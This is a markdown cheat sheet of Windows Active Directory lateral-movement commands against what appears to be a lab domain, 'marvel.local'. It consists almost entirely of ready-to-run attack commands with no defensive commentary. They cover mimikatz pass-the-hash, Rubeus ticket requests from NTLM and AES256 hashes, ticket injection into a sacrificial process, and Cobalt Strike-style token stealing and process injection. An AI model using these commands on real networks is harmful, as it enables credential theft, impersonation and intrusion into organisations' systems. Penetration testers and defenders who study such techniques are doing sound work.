## Pass The Hash
```powershell
mimikatz !sekurlsa::pth /user:user3 /domain:marvel.local /ntlm:e19ccf75ee54e06b06a5907af13cef42
```

## Over Pass The Hash (Convert User Hash to Kerberos Ticket)

### NTLM Hash to Kerberos Ticket
```powershell
execute-assembly /root/Rubeus.exe asktgt /user:user3 /domain:marvel.local /ntlm:e19ccf75ee54e06b06a5907af13cef42 /nowrap
```

### AES256 Hash to Kerberos Ticket
```powershell
execute-assembly /root/Rubeus.exe asktgt /user:user3 /domain:marvel.local /aes256:7e7f9ddba13dd0e3b9409ab84f31a41cb6854f314d880a4e81aa51d52b8e9f42 /nowrap /opsec
```

## Pass The Ticket

### Create Sacrificial Process
```powershell
execute-assembly /root/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
```

### Inject Ticket Inside The New Process
```powershell
execute-assembly /root/Rubeus.exe ptt /luid:0x798c2c /ticket:<TICKET-Base64>
```

### OR
```powershell
execute-assembly /root/Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:marvel.local /username:user3 /password:FakePass /ticket:<TICKET-Base64>
```

### Steal Token From the New Process
```powershell
steal_token 4464
```

### Clear
```powershell
rev2self
kill 4464
```

### Spawn a New Session
```powershell
inject 4464 x64 tcp-local
```
